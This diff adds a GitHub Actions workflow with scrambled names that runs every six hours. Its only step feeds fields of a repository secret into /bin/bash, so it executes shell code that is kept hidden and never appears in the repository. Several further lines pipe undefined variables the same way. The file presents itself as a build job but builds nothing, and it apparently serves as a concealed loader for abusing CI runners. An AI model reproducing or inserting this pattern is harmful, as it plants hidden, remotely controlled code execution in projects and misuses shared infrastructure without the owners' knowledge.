@@ -1,0 +1,23 @@
+name: biajxxk
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: biajxxk
+        env:
+          ipdtv31825: ${{ secrets.ipdtv31825 }}
+        run: |
+          echo $ipdtv31825 | jq -r .eu10 | /bin/bash
+          echo $kldp22 | jq -r .dx677 | /bin/bash
+          echo $as22 | jq -r .pzid2 | /bin/bash
+          echo $v2277 | jq -r .ejlb4 | /bin/bash
+          echo $v24196 | jq -r .tb20 | /bin/bash
+
